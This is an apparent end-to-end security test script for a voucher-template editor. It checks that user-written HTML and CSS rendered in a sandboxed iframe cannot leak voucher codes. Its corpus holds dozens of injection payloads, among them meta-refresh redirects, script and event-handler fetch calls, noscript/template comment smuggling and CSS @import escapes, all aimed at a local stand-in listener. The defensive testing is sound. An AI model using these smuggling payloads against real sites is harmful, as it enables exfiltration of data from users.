// Live Voucher render frame E2E (ADR-0041 / #33 / #40): own debug Admin on a fresh
// data dir, the real built Web Admin, headless Chromium over CDP, no mocks.
//
//   bun run build:web-admin && cargo build -p openpiso-admin
//   bun run apps/web-admin/scripts/voucher-render-frame-browser.ts
//
// Env: OPENPISO_ADMIN_BINARY, OPENPISO_E2E_OUT, CHROME_PATH. Needs free ports 8080
// and 3210. Writes voucher-render-frame.json + screenshots to the output dir.
//
// Test-only fault injection (CDP `Runtime.evaluate` into the frame, never in
// production code): inside sandboxed frames only, `window.print` is replaced by a
// logger (headless cannot show the dialog) that fires `afterprint` 1.5 s later, and
// for the "never finishes" cases `parent.postMessage` is silenced.

import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  openSync,
  readdirSync,
  writeFileSync,
} from "node:fs";
import { createConnection } from "node:net";
import { homedir, tmpdir } from "node:os";
import { join, resolve } from "node:path";
import {
  assertProcessRunning,
  removeBrowserProfile,
  stopProcessTree,
} from "../../client/scripts/browser-harness-process";

const root = resolve(import.meta.dir, "../../..");
const outDir = resolve(
  process.env.OPENPISO_E2E_OUT ??
    join(tmpdir(), `openpiso-voucher-render-frame-${Date.now()}`),
);
mkdirSync(outDir, { recursive: true });
const origin = "http://127.0.0.1:8080";
const binary = resolve(
  process.env.OPENPISO_ADMIN_BINARY ??
    join(
      process.env.CARGO_TARGET_DIR ?? join(root, "target"),
      "debug/openpiso-admin",
    ),
);

function findChrome(): string | undefined {
  if (process.env.CHROME_PATH) return process.env.CHROME_PATH;
  const cache = join(homedir(), ".cache/ms-playwright");
  const cached = existsSync(cache)
    ? readdirSync(cache)
        .filter((name) => name.startsWith("chromium-"))
        .map((name) => join(cache, name, "chrome-linux64/chrome"))
    : [];
  return [
    ...cached,
    "C:/Program Files/Google/Chrome/Application/chrome.exe",
    "/usr/bin/google-chrome",
    "/usr/bin/chromium",
  ].find(existsSync);
}
const chrome = findChrome();
if (!chrome) throw new Error("Chrome/Chromium not found (set CHROME_PATH)");
if (process.platform !== "linux")
  throw new Error("This launcher uses Linux XDG_DATA_HOME.");

async function requireFreePort(port: number): Promise<void> {
  const occupied = await new Promise<boolean>((done) => {
    const socket = createConnection({ host: "127.0.0.1", port });
    socket.setTimeout(1000);
    socket.once("connect", () => {
      socket.destroy();
      done(true);
    });
    socket.once("error", () => done(false));
    socket.once("timeout", () => {
      socket.destroy();
      done(true);
    });
  });
  if (occupied) throw new Error(`Port ${port} occupied; stop the other Admin.`);
}

// ------------------------------------------------------------------ results

interface Check {
  name: string;
  ok: boolean;
  detail?: string;
}
const checks: Check[] = [];
function check(name: string, ok: boolean, detail?: string): void {
  checks.push({ name, ok, ...(detail ? { detail } : {}) });
  console.log(
    `${ok ? "ok  " : "FAIL"} ${name}${detail && !ok ? ` — ${detail}` : ""}`,
  );
}

// ------------------------------------------------------------ leak listeners

/** Anything that reaches this HTTP listener or raw TCP port is a leak. */
const httpHits: string[] = [];
const tcpHits: string[] = [];
const listener = Bun.serve({
  hostname: "127.0.0.1",
  port: 0,
  fetch(request) {
    httpHits.push(new URL(request.url).pathname + new URL(request.url).search);
    return new Response("<!doctype html>leaked", {
      headers: { "Content-Type": "text/html" },
    });
  },
});
const rawListener = Bun.listen({
  hostname: "127.0.0.1",
  port: 0,
  socket: {
    open(socket) {
      tcpHits.push("connect");
      socket.end();
    },
    data() {},
  },
});
const listenerOrigin = `http://127.0.0.1:${listener.port}`;

// --------------------------------------------------------------------- Admin

const dataHome = mkdtempSync(join(tmpdir(), "openpiso-voucher-render-data-"));
const adminLog = openSync(join(outDir, "admin.log"), "a");
let admin: ReturnType<typeof Bun.spawn> | undefined;

// ----------------------------------------------------------------------- CDP

const cdpPort = 9880 + (process.pid % 40);
let nextId = 0;
let ws: WebSocket | undefined;
const pending = new Map<
  number,
  { resolve: (value: unknown) => void; reject: (error: Error) => void }
>();
function call(
  method: string,
  params: object = {},
  sessionId?: string,
): Promise<unknown> {
  const socket = ws;
  if (!socket) return Promise.reject(new Error("CDP not connected"));
  const id = ++nextId;
  return new Promise((resolveValue, reject) => {
    pending.set(id, { resolve: resolveValue, reject });
    socket.send(JSON.stringify({ id, method, params, sessionId }));
  });
}

interface EvalResponse<T> {
  result: { value: T };
  exceptionDetails?: { text: string; exception?: { description?: string } };
}
async function evaluate<T>(
  expression: string,
  contextId?: number,
  sessionId?: string,
): Promise<T> {
  const response = (await call(
    "Runtime.evaluate",
    {
      expression,
      awaitPromise: true,
      returnByValue: true,
      ...(contextId === undefined ? {} : { contextId }),
    },
    sessionId,
  )) as EvalResponse<T>;
  if (response.exceptionDetails)
    throw new Error(
      `${response.exceptionDetails.exception?.description ?? response.exceptionDetails.text} :: ${expression.slice(0, 120)}`,
    );
  return response.result.value;
}

async function waitFor(
  expression: string,
  label: string,
  tries = 100,
): Promise<void> {
  for (let i = 0; i < tries; i++) {
    if (await evaluate<boolean>(expression)) return;
    await Bun.sleep(100);
  }
  const body = await evaluate<string>("document.body.innerText.slice(0, 400)");
  throw new Error(`Timeout: ${label}\n--- page ---\n${body}`);
}

async function click(selector: string): Promise<void> {
  const point = await evaluate<{ x: number; y: number } | null>(
    `(() => { const el = document.querySelector(${JSON.stringify(selector)}); if (!el) return null; el.scrollIntoView({block:'center'}); const r = el.getBoundingClientRect(); return { x: r.x + r.width / 2, y: r.y + r.height / 2 }; })()`,
  );
  if (!point) throw new Error(`Missing element: ${selector}`);
  await call("Input.dispatchMouseEvent", { type: "mouseMoved", ...point });
  await call("Input.dispatchMouseEvent", {
    type: "mousePressed",
    ...point,
    button: "left",
    clickCount: 1,
  });
  await call("Input.dispatchMouseEvent", {
    type: "mouseReleased",
    ...point,
    button: "left",
    clickCount: 1,
  });
}

async function screenshot(name: string): Promise<void> {
  const shot = (await call("Page.captureScreenshot", { format: "png" })) as {
    data: string;
  };
  writeFileSync(join(outDir, name), Buffer.from(shot.data, "base64"));
}

// Execution contexts per frame, so the sandboxed (opaque-origin) frame can be read.
const frameContexts = new Map<string, number>();
let mainFrameId = "";
/** Frame requests by CDP request id; CSP-blocked ones are removed again. */
const frameRequests = new Map<string, string>();
const printCalls: string[] = [];

const PRINT_HOOK = `if (location.href === 'about:srcdoc') { window.print = () => { console.debug('__e2e_print__'); setTimeout(() => dispatchEvent(new Event('afterprint')), 1500); }; }`;
const SILENCE_HOOK = `if (location.href === 'about:srcdoc') { Object.defineProperty(window, 'parent', { value: { postMessage() {} }, configurable: true }); }`;

// The sandboxed frame (opaque origin) is its own CDP target. Test hooks are
// evaluated in each of its documents as soon as the context exists, which is
// well before the tail's 500 ms settle wait.
/** Records every toast's text as it appears (toasts expire and are re-rendered). */
const TOAST_RECORDER = `window.__toasts = []; const seen = new WeakSet(); new MutationObserver(() => { for (const el of document.querySelectorAll('[data-sonner-toast]')) { const text = el.textContent?.trim(); if (text && !seen.has(el)) { seen.add(el); window.__toasts.push(text); } } }).observe(document, { childList: true, subtree: true, characterData: true });`;
const activeHooks = new Set<string>([PRINT_HOOK]);
let frameSession: string | undefined;

/** Applies `source` to every frame document from now on; returns its remover. */
async function addHook(source: string): Promise<() => void> {
  activeHooks.add(source);
  return () => void activeHooks.delete(source);
}

async function setUpFrameTarget(sessionId: string): Promise<void> {
  await call("Runtime.enable", {}, sessionId);
  await call("Network.enable", {}, sessionId);
  await call("Runtime.runIfWaitingForDebugger", {}, sessionId);
}

interface CdpEvent {
  method: string;
  params: {
    context?: {
      id: number;
      auxData?: { frameId?: string; isDefault?: boolean };
    };
    executionContextId?: number;
    frameId?: string;
    request?: { url: string };
    type?: string;
    args?: { value?: unknown }[];
    sessionId?: string;
    requestId?: string;
    blockedReason?: string;
  };
  /** The CDP session the event came from; absent for the page itself. */
  sessionId?: string;
}
function onEvent({ method, params, sessionId }: CdpEvent): void {
  if (method === "Runtime.executionContextCreated" && sessionId) {
    const context = params.context;
    if (context?.auxData?.isDefault)
      for (const source of activeHooks)
        void evaluate(source, context.id, sessionId).catch(() => {});
  } else if (method === "Target.attachedToTarget" && params.sessionId) {
    frameSession = params.sessionId;
    void setUpFrameTarget(params.sessionId);
  } else if (method === "Target.detachedFromTarget") {
    if (params.sessionId === frameSession) frameSession = undefined;
  } else if (method === "Runtime.executionContextCreated" && params.context) {
    const { id, auxData } = params.context;
    if (auxData?.frameId && auxData.isDefault)
      frameContexts.set(auxData.frameId, id);
  } else if (method === "Runtime.executionContextDestroyed") {
    for (const [frame, id] of frameContexts)
      if (id === params.executionContextId) frameContexts.delete(frame);
  } else if (method === "Runtime.executionContextsCleared") {
    frameContexts.clear();
  } else if (method === "Network.requestWillBeSent" && params.request) {
    const url = params.request.url;
    // Admin page traffic (main frame) is legitimate; any request a child frame
    // makes (even to the Admin itself) is a leak unless CSP blocked it.
    if (!/^https?:/.test(url) || params.frameId === mainFrameId) return;
    if (params.requestId) frameRequests.set(params.requestId, url);
  } else if (method === "Network.loadingFailed" && params.blockedReason) {
    if (params.requestId) frameRequests.delete(params.requestId);
  } else if (
    method === "Runtime.consoleAPICalled" &&
    params.args?.[0]?.value === "__e2e_print__"
  ) {
    printCalls.push("print");
  }
}

interface FrameNode {
  frame: { id: string; url: string };
  childFrames?: FrameNode[];
}
async function childFrameId(): Promise<string | undefined> {
  const tree = (await call("Page.getFrameTree")) as { frameTree: FrameNode };
  mainFrameId = tree.frameTree.frame.id;
  return tree.frameTree.childFrames?.[0]?.frame.id;
}
/** Evaluate inside the (sandboxed) render frame; undefined if no frame. */
async function inFrame<T>(expression: string): Promise<T | undefined> {
  if (frameSession) return evaluate<T>(expression, undefined, frameSession);
  const frameId = await childFrameId();
  const contextId = frameId ? frameContexts.get(frameId) : undefined;
  if (contextId === undefined) return undefined;
  return evaluate<T>(expression, contextId);
}

// ------------------------------------------------------------- Owner session

let ownerCookie = "";
let csrf = "";
async function ownerFetch(
  method: string,
  path: string,
  body?: unknown,
): Promise<unknown> {
  const response = await fetch(`${origin}${path}`, {
    method,
    headers: {
      "Content-Type": "application/json",
      Origin: origin,
      Cookie: `op_owner=${ownerCookie}`,
      "X-CSRF-Token": csrf,
    },
    body: body === undefined ? undefined : JSON.stringify(body),
  });
  if (!response.ok)
    throw new Error(
      `${method} ${path}: ${response.status} ${await response.text()}`,
    );
  return response.json();
}

// ------------------------------------------------------------------- cases

interface Case {
  name: string;
  html: string;
  css?: string;
  shopName?: string;
}

const L = `${listenerOrigin}/x?c={{code}}`;
const raw = rawListener.port;
const V = `<div class="v">{{code}}</div>`;
const META = `<meta http-equiv="refresh" content="0;url=${L}">`;

/** The #33 HTML/CSS-only regression corpus. Every case must produce zero leaks. */
const corpus: Case[] = [
  { name: "meta refresh plain", html: V + META },
  {
    name: "META uppercase slash",
    html: V + `<META/http-equiv=refresh content="0;url=${L}">`,
  },
  {
    name: "meta > inside quoted attr",
    html: V + `<meta content="0;url=${L}&x=>" http-equiv="refresh">`,
  },
  {
    name: "meta newline in tag",
    html: V + `<meta\nhttp-equiv="refresh"\ncontent="0;url=${L}">`,
  },
  {
    name: "meta split by script",
    html:
      V + `<me<script></script>ta http-equiv="refresh" content="0;url=${L}">`,
  },
  {
    name: "meta dangling no >",
    html: V + `<meta http-equiv=refresh content=0;url=${L}`,
  },
  {
    name: "meta dangling quoted no >",
    html: V + `<meta http-equiv="refresh" content="0;url=${L}`,
  },
  { name: "dangling <script", html: V + `<script` },
  { name: "dangling <script src", html: V + `<script src=${L}` },
  {
    name: "scr<meta>ipt",
    html: V + `<scr<meta>ipt>fetch("${L}")</scr<meta>ipt>`,
  },
  { name: "script in card", html: V + `<script>fetch("${L}")</script>` },
  {
    name: "inline handlers",
    html:
      V +
      `<img src="data:," onerror="fetch('${L}')"><svg onload="fetch('${L}')"></svg><button autofocus onfocus="fetch('${L}')">x</button>`,
  },
  {
    name: "javascript: link autofocus",
    html: V + `<a href="javascript:fetch('${L}')" autofocus>x</a>`,
  },
  { name: "unclosed svg foreignObject", html: V + `<svg><foreignObject><svg>` },
  { name: "unclosed math", html: V + `<math><mi>` },
  { name: "unclosed template", html: V + `<template>` },
  { name: "unclosed textarea", html: V + `<textarea>` },
  { name: "unclosed title", html: V + `<title>` },
  { name: "unclosed style", html: V + `<style>` },
  { name: "unclosed comment", html: V + `<!--` },
  { name: "unclosed plaintext", html: V + `<plaintext>` },
  { name: "unclosed noscript", html: V + `<noscript>` },
  { name: "stray quote", html: V + `<div class="` },
  {
    name: "noscript comment smuggle (meta)",
    html: V + `<noscript><!--</noscript>${META}--></noscript>`,
  },
  {
    name: "noscript comment smuggle (script)",
    html:
      V +
      `<noscript><!--</noscript><script>fetch("${L}")</script>--></noscript>`,
  },
  {
    name: "template > noscript smuggle (meta)",
    html:
      V +
      `<template><noscript><!--</noscript></template>${META}--></noscript></template>`,
  },
  {
    name: "template > noscript smuggle (script)",
    html:
      V +
      `<template><noscript><!--</noscript><script>fetch("${L}")--></noscript></template>`,
  },
  {
    name: "declarative shadow root smuggle",
    html:
      V +
      `<template shadowrootmode="open"><noscript><!--</noscript></template>${META}--></noscript></template>`,
  },
  {
    name: "nested template smuggle",
    html:
      V +
      `<template><template><noscript><!--</noscript></template></template>${META}--></noscript></template></template>`,
  },
  {
    name: "base href",
    html: V + `<base href="${listenerOrigin}/"><a href="x">x</a>`,
  },
  {
    name: "preconnect SNI",
    html:
      V + `<link rel="preconnect" href="https://{{code}}.localhost:${raw}/">`,
  },
  {
    name: "preconnect http",
    html: V + `<link rel="preconnect" href="http://127.0.0.1:${raw}/">`,
  },
  {
    name: "dns-prefetch",
    html:
      V + `<link rel="dns-prefetch" href="https://{{code}}.localhost:${raw}/">`,
  },
  {
    name: "link prefetch",
    html: V + `<link rel="prefetch" href="${L}&k=prefetch">`,
  },
  {
    name: "link preload",
    html: V + `<link rel="preload" as="image" href="${L}&k=preload">`,
  },
  {
    name: "link stylesheet",
    html: V + `<link rel="stylesheet" href="${L}&k=css">`,
  },
  { name: "img srcset", html: V + `<img srcset="${L}&k=srcset 1x">` },
  { name: "img src", html: V + `<img src="${L}&k=img">` },
  { name: "video poster", html: V + `<video poster="${L}&k=poster"></video>` },
  {
    name: "object/embed",
    html: V + `<object data="${L}&k=obj"></object><embed src="${L}&k=embed">`,
  },
  {
    name: "svg image/feImage",
    html:
      V +
      `<svg><image href="${L}&k=svgimg"/><filter id=f><feImage href="${L}&k=feimg"/></filter></svg>`,
  },
  {
    name: "anchor + svg animate href",
    html:
      V +
      `<a href="${L}&k=a" target="_self" autofocus>x</a><svg><a><animate attributeName="href" values="${L}&k=anim"/><text y=20>t</text></a></svg>`,
  },
  {
    name: "form autofocus button",
    html: V + `<form action="${L}&k=form"><button autofocus>go</button></form>`,
  },
  { name: "iframe src", html: V + `<iframe src="${L}&k=iframe"></iframe>` },
  {
    name: "CSS url/@import/@font-face/image-set",
    html: V,
    css: `@import url("${listenerOrigin}/x?k=import");@font-face{font-family:F;src:url("${listenerOrigin}/x?k=font")}.v{font-family:F;background:url("${listenerOrigin}/x?k=bg");border-image:image-set("${listenerOrigin}/x?k=iset" 1x) 1}`,
  },
  {
    name: "CSS escape </style> meta",
    html: V,
    css: `.v{color:red}</style>${META}<style>`,
  },
  {
    name: "CSS escape </STYLE > script",
    html: V,
    css: `.v{color:red}</STYLE ><script>fetch("${L}")</script><style>`,
  },
  {
    name: "CSS escape </style with comment",
    html: V,
    css: `/*</style><meta http-equiv="refresh" content="0;url=${listenerOrigin}/css">*/`,
  },
  {
    name: "markup in token (shop_name)",
    html: V + `<p>{{shop_name}}</p>`,
    shopName: `"><meta http-equiv=refresh content=0;url=${listenerOrigin}/s>`,
  },
];

// -------------------------------------------------------------------- driver

interface Outcome {
  status: "ready" | "error" | "timeout";
  message: string;
  height?: number;
  frameHeight?: number;
  codesPresent?: boolean;
}

const PREVIEW = `[data-voucher-render="preview"]`;
const printFrameSelector = `iframe[data-voucher-print]`;

async function openVouchers(tab: "Template" | "Batches"): Promise<void> {
  await call("Page.navigate", { url: `${origin}/admin/vouchers` });
  await waitFor(
    `Array.from(document.querySelectorAll('button')).some(b => b.textContent.trim() === ${JSON.stringify(tab)})`,
    "Vouchers tabs",
  );
  await evaluate(
    `Array.from(document.querySelectorAll('button')).find(b => b.textContent.trim() === ${JSON.stringify(tab)}).setAttribute('data-e2e-tab','')`,
  );
  await click("[data-e2e-tab]");
}

async function renderSeq(): Promise<number> {
  return evaluate<number>(
    `Number(document.querySelector('${PREVIEW}')?.dataset.renderSeq ?? 0)`,
  );
}

/** Type into the Template editors (live preview, no save) and read the outcome. */
async function previewCase(c: Case): Promise<Outcome> {
  const before = await renderSeq();
  // An unchanged template does not re-render, so only wait for a new render
  // when an editor value actually changed.
  const changed = await evaluate<boolean>(`(() => {
    let changed = false;
    const set = (id, v) => { const el = document.getElementById(id); if (el.value === v) return; changed = true; el.value = v; el.dispatchEvent(new Event('input', { bubbles: true })); };
    set('voucher-template-html', ${JSON.stringify(c.html)});
    set('voucher-template-css', ${JSON.stringify(c.css ?? "")});
    return changed;
  })()`);
  await waitFor(
    `(() => { const el = document.querySelector('${PREVIEW}'); return el && ${changed ? `Number(el.dataset.renderSeq) > ${before} && ` : ""}el.dataset.renderStatus !== 'rendering'; })()`,
    `preview settles: ${c.name}`,
    100,
  );
  const state = await evaluate<{
    status: Outcome["status"];
    message: string;
    frameHeight: number;
  }>(
    `(() => { const el = document.querySelector('${PREVIEW}'); return { status: el.dataset.renderStatus, message: el.querySelector('[data-render-error]')?.textContent ?? '', frameHeight: el.querySelector('iframe').offsetHeight }; })()`,
  );
  const outcome: Outcome = { ...state };
  if (state.status === "ready") {
    outcome.height = await inFrame<number>(
      `Math.ceil(document.documentElement.getBoundingClientRect().height)`,
    );
    outcome.codesPresent = await inFrame<boolean>(
      `document.body.textContent.includes('DEMO-ABCD-2345')`,
    );
  }
  return outcome;
}

let batchCodes: string[] = [];

/** Save through the API (real PUT), print the batch through the UI, read the outcome. */
async function printCase(c: Case): Promise<Outcome> {
  await ownerFetch("PUT", "/web-admin/voucher-template", {
    html: c.html,
    css: c.css ?? "/* e2e */",
  });
  await evaluate(
    `document.querySelectorAll('${printFrameSelector}').forEach((f) => f.remove()); window.__toasts.length = 0; true`,
  );
  printCalls.length = 0;
  await click("[data-e2e-print]");
  const deadline = Date.now() + 10_000;
  while (Date.now() < deadline) {
    const state = await evaluate<{ frame: string | null; toast: string }>(
      `({ frame: document.querySelector('${printFrameSelector}')?.dataset.renderStatus ?? null, toast: window.__toasts.join(' | ') })`,
    );
    if (state.frame === "ready") {
      const height = await inFrame<number>(
        `Math.ceil(document.documentElement.getBoundingClientRect().height)`,
      );
      const codesPresent = await inFrame<boolean>(
        `${JSON.stringify(batchCodes)}.every((code) => document.body.textContent.includes(code))`,
      );
      // The hooked print() logged; afterprint then removes the frame.
      return { status: "ready", message: "", height, codesPresent };
    }
    if (state.toast && /print|render|timed out|voucher/i.test(state.toast))
      return {
        status: /timed out|timeout/i.test(state.toast) ? "timeout" : "error",
        message: state.toast,
      };
    await Bun.sleep(100);
  }
  throw new Error(`print outcome never observed: ${c.name}`);
}

/** Pass = no leak, and either ready with every code present, or a visible error/timeout. */
function judge(
  mode: string,
  c: Case,
  outcome: Outcome,
  leaks: string[],
  rows: object[],
): void {
  const visibleFailure =
    outcome.status !== "ready" && outcome.message.length > 0;
  const rendered = outcome.status === "ready" && outcome.codesPresent === true;
  const ok = leaks.length === 0 && (rendered || visibleFailure);
  rows.push({
    mode,
    case: c.name,
    outcome: outcome.status,
    message: outcome.message,
    codesPresent: outcome.codesPresent,
    leaks,
  });
  check(
    `corpus ${mode}: ${c.name}`,
    ok,
    `${outcome.status} ${outcome.message} codes=${outcome.codesPresent} leaks=${JSON.stringify(leaks)}`,
  );
}

function takeLeaks(): string[] {
  const leaks = [
    ...httpHits.map((h) => `http ${h}`),
    ...tcpHits.map((h) => `tcp ${h}`),
    ...frameRequests.values().map((u) => `frame request ${u}`),
  ];
  httpHits.length = 0;
  tcpHits.length = 0;
  frameRequests.clear();
  return leaks;
}

// ----------------------------------------------------------------------- run

const profile = mkdtempSync(join(tmpdir(), "openpiso-voucher-render-profile-"));
let browser: ReturnType<typeof Bun.spawn> | undefined;
const corpusRows: object[] = [];
let failure: unknown;
try {
  await requireFreePort(8080);
  await requireFreePort(3210);
  admin = Bun.spawn([binary], {
    cwd: root,
    env: { ...process.env, XDG_DATA_HOME: dataHome },
    stdout: adminLog,
    stderr: adminLog,
  });
  for (let i = 0; ; i++) {
    if (admin.exitCode !== null)
      throw new Error("Admin exited before readiness; see admin.log");
    try {
      if ((await fetch(`${origin}/web-admin/session`)).ok) break;
    } catch {}
    if (i > 300) throw new Error("Admin readiness timed out");
    await Bun.sleep(100);
  }

  // Owner setup over real HTTP; the session cookie is then handed to the browser.
  const pin = String(
    crypto.getRandomValues(new Uint32Array(1))[0] % 100_000_000,
  ).padStart(8, "0");
  const setup = await fetch(`${origin}/web-admin/setup`, {
    method: "POST",
    headers: { "Content-Type": "application/json", Origin: origin },
    body: JSON.stringify({ pin }),
  });
  if (!setup.ok) throw new Error(`setup failed: ${setup.status}`);
  csrf = ((await setup.json()) as { csrf_token: string }).csrf_token;
  ownerCookie =
    /op_owner=([^;]+)/.exec(setup.headers.get("set-cookie") ?? "")?.[1] ?? "";
  if (!ownerCookie) throw new Error("no op_owner cookie");

  const batch = (await ownerFetch("POST", "/web-admin/voucher-batches", {
    prefix: "E2E",
    suffix_length: 6,
    count: 3,
    seconds_value: 3600,
    points_value_centi: 0,
    cash_amount_cents: 5000,
    expires_at: null,
  })) as { id: string };
  const detail = (await ownerFetch(
    "GET",
    `/web-admin/voucher-batches/${batch.id}`,
  )) as {
    vouchers: { code: string }[];
  };
  batchCodes = detail.vouchers.map((v) => v.code);
  check("fixture: batch of 3 cards created", batchCodes.length === 3);

  browser = Bun.spawn(
    [
      chrome,
      "--headless=new",
      `--remote-debugging-port=${cdpPort}`,
      `--user-data-dir=${profile}`,
      "--no-first-run",
      "--disable-gpu",
      "about:blank",
    ],
    { stdout: "ignore", stderr: "ignore" },
  );
  await assertProcessRunning(browser, "Chromium");
  for (let i = 0; ; i++) {
    try {
      if ((await fetch(`http://127.0.0.1:${cdpPort}/json/version`)).ok) break;
    } catch {}
    if (i > 100) throw new Error("CDP not reachable");
    await Bun.sleep(100);
  }
  const targets = (await (
    await fetch(`http://127.0.0.1:${cdpPort}/json/list`)
  ).json()) as {
    type: string;
    webSocketDebuggerUrl: string;
  }[];
  const target = targets.find((t) => t.type === "page");
  if (!target) throw new Error("No page");
  const socket = new WebSocket(target.webSocketDebuggerUrl);
  ws = socket;
  await new Promise<void>((open, reject) => {
    socket.onopen = () => open();
    socket.onerror = () => reject(new Error("CDP failed"));
  });
  socket.onmessage = (event) => {
    const message = JSON.parse(String(event.data)) as {
      id?: number;
      method?: string;
      sessionId?: string;
      params?: CdpEvent["params"];
      result?: unknown;
      error?: { message: string };
    };
    if (message.method)
      return onEvent({
        method: message.method,
        params: message.params ?? {},
        sessionId: message.sessionId,
      });
    const waiter = message.id ? pending.get(message.id) : undefined;
    if (!waiter) return;
    pending.delete(message.id as number);
    message.error
      ? waiter.reject(new Error(message.error.message))
      : waiter.resolve(message.result);
  };
  await call("Runtime.enable");
  await call("Page.enable");
  await call("Network.enable");
  await childFrameId(); // records the main frame id
  await call("Emulation.setDeviceMetricsOverride", {
    width: 1280,
    height: 900,
    deviceScaleFactor: 1,
    mobile: false,
  });
  await call("Network.setCookie", {
    name: "op_owner",
    value: ownerCookie,
    url: origin,
    httpOnly: true,
    sameSite: "Strict",
  });
  await call("Page.addScriptToEvaluateOnNewDocument", {
    source: TOAST_RECORDER,
  });
  await call("Target.setAutoAttach", {
    autoAttach: true,
    waitForDebuggerOnStart: true,
    flatten: true,
  });

  // ---- Preview: default template renders through the sandboxed frame.
  await openVouchers("Template");
  await waitFor(
    `document.getElementById('voucher-template-html')?.value.length > 0`,
    "template editors loaded",
  );
  await waitFor(
    `document.querySelector('${PREVIEW}')?.dataset.renderStatus === 'ready'`,
    "default preview ready",
    100,
  );
  await childFrameId();
  const sandbox = await evaluate<string>(
    `document.querySelector('${PREVIEW} iframe').getAttribute('sandbox')`,
  );
  check(
    "preview frame sandbox is allow-scripts allow-modals (no allow-same-origin)",
    sandbox.split(/\s+/).sort().join(" ") === "allow-modals allow-scripts",
    sandbox,
  );
  const defaultOutcome = await previewCase({
    name: "default",
    html: await evaluate<string>(
      `document.getElementById('voucher-template-html').value`,
    ),
    css: await evaluate<string>(
      `document.getElementById('voucher-template-css').value`,
    ),
  });
  check(
    "preview: default template reaches ready with its code",
    defaultOutcome.status === "ready" && defaultOutcome.codesPresent === true,
    JSON.stringify(defaultOutcome),
  );
  check(
    "preview: frame height matches content",
    defaultOutcome.height !== undefined &&
      defaultOutcome.frameHeight !== undefined &&
      Math.abs(defaultOutcome.frameHeight - defaultOutcome.height) <= 1,
    `frame=${defaultOutcome.frameHeight} content=${defaultOutcome.height}`,
  );
  await screenshot("preview-default.png");

  const grow = await previewCase({
    name: "tall",
    html: `<div style="height:900px">{{code}}</div>`,
  });
  check(
    "preview: frame grows with taller content",
    grow.status === "ready" &&
      grow.height !== undefined &&
      grow.height >= 900 &&
      grow.frameHeight === grow.height,
    JSON.stringify(grow),
  );
  const shrink = await previewCase({
    name: "short",
    html: `<div style="height:40px">{{code}}</div>`,
  });
  check(
    "preview: frame shrinks with shorter content",
    shrink.status === "ready" &&
      shrink.height !== undefined &&
      shrink.height >= 40 &&
      shrink.height < 100 &&
      shrink.frameHeight === shrink.height,
    JSON.stringify(shrink),
  );

  // ---- Preview: lost code and a document that never finishes.
  const lost = await previewCase({
    name: "lost code",
    html: `<noscript>{{code}}</noscript><b>x</b>`,
  });
  check(
    "preview: card that loses its code shows an error",
    lost.status === "error" && /DEMO-ABCD-2345|code/i.test(lost.message),
    JSON.stringify(lost),
  );
  await screenshot("preview-lost-code.png");

  const removeSilence = await addHook(SILENCE_HOOK);
  const never = await previewCase({ name: "never finishes", html: V });
  check(
    "preview: a render that never reports shows a timeout",
    never.status === "timeout" && never.message.length > 0,
    JSON.stringify(never),
  );
  await screenshot("preview-timeout.png");
  removeSilence();

  // ---- Corpus through the preview.
  takeLeaks();
  for (const c of corpus) {
    if (c.shopName) {
      await ownerFetch("PUT", "/web-admin/settings", {
        shop_name: c.shopName,
        shutdown_grace_seconds: 30,
        offline_grace_seconds: 30,
      });
      await openVouchers("Template");
      await waitFor(
        `document.querySelector('${PREVIEW}')?.dataset.renderStatus === 'ready'`,
        "preview after shop rename",
        100,
      );
    }
    const outcome = await previewCase(c);
    await Bun.sleep(300); // let any late request surface
    judge("preview", c, outcome, takeLeaks(), corpusRows);
  }
  await ownerFetch("PUT", "/web-admin/settings", {
    shop_name: "OpenPiso Shop",
    shutdown_grace_seconds: 30,
    offline_grace_seconds: 30,
  });

  // ---- Print path (real Voucher Batch).
  await openVouchers("Batches");
  await waitFor(`document.body.innerText.includes('E2E')`, "batch list");
  await evaluate(
    `Array.from(document.querySelectorAll('button')).find(b => b.textContent.includes('E2E')).setAttribute('data-e2e-batch','')`,
  );
  await click("[data-e2e-batch]");
  await waitFor(
    `Array.from(document.querySelectorAll('button')).some(b => b.textContent.trim() === 'Print')`,
    "batch detail",
  );
  await evaluate(
    `Array.from(document.querySelectorAll('button')).find(b => b.textContent.trim() === 'Print').setAttribute('data-e2e-print','')`,
  );

  const defaultHtml = (await ownerFetch(
    "GET",
    "/web-admin/voucher-template",
  )) as { default_html: string; default_css: string };
  const printDefault = await printCase({
    name: "default",
    html: defaultHtml.default_html,
    css: defaultHtml.default_css,
  });
  check(
    "print: default template reaches ready with all 3 codes",
    printDefault.status === "ready" && printDefault.codesPresent === true,
    JSON.stringify(printDefault),
  );
  check(
    "print: frame sandbox + hidden",
    (
      await evaluate<string>(
        `document.querySelector('${printFrameSelector}')?.getAttribute('sandbox') ?? ''`,
      )
    )
      .split(/\s+/)
      .sort()
      .join(" ") === "allow-modals allow-scripts",
  );
  await Bun.sleep(200);
  check(
    "print: print() was called on the frame",
    printCalls.length === 1,
    String(printCalls.length),
  );
  await waitFor(
    `!document.querySelector('${printFrameSelector}')`,
    "print frame removed after afterprint",
    60,
  );
  check("print: frame removed after afterprint", true);

  const printLost = await printCase({
    name: "lost code",
    html: `<noscript>{{code}}</noscript>`,
  });
  check(
    "print: card that loses its code is blocked with an error",
    printLost.status === "error" && printCalls.length === 0,
    JSON.stringify(printLost),
  );
  const removeSilence2 = await addHook(SILENCE_HOOK);
  const printNever = await printCase({ name: "never finishes", html: V });
  check(
    "print: a render that never reports times out with a visible error",
    printNever.status === "timeout",
    JSON.stringify(printNever),
  );
  removeSilence2();
  check(
    "print: failed prints leave no frame behind",
    await evaluate<boolean>(`!document.querySelector('${printFrameSelector}')`),
  );

  takeLeaks();
  for (const c of corpus.filter((x) => !x.shopName)) {
    const outcome = await printCase(c);
    await Bun.sleep(300);
    judge("print", c, outcome, takeLeaks(), corpusRows);
  }
} catch (error) {
  failure = error;
  check(
    "harness completed",
    false,
    error instanceof Error ? error.message : String(error),
  );
  try {
    await screenshot("failure.png");
  } catch {}
} finally {
  if (browser) {
    stopProcessTree(browser);
    await browser.exited;
  }
  removeBrowserProfile(profile);
  if (admin) {
    stopProcessTree(admin);
    await admin.exited;
  }
  listener.stop(true);
  rawListener.stop(true);
  const ok = checks.every((c) => c.ok);
  writeFileSync(
    join(outDir, "voucher-render-frame.json"),
    JSON.stringify({ ok, dataHome, checks, corpus: corpusRows }, null, 2),
  );
  console.log(
    `${ok ? "PASS" : "FAIL"}: voucher render frame E2E. Artifacts: ${outDir}`,
  );
  if (!ok) process.exitCode = 1;
}
